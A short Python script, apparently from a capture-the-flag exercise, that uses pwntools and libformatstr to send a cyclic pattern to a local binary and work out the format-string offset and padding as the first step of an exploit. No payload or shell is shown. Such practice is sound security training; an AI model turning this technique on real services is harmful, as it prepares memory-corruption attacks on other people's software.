#!/usr/bin/env python
from libformatstr import *      # need this for libformatstr
from pwn import *
import sys

bufsiz = 100                    # size of cyclic pattern to send
buf = "" 
r = process('./pwn')

# PART 1 - getting format string offset
r.recvuntil("Do you know repeater?\n")

r.send(make_pattern(bufsiz) + "\n")             # send cyclic pattern to server
data = r.recv()                                 # server's response
offset, padding = guess_argnum(data, bufsiz)    # find format string offset and padding
log.info("offset : " + str(offset))
log.info("padding: " + str(padding))
r.close()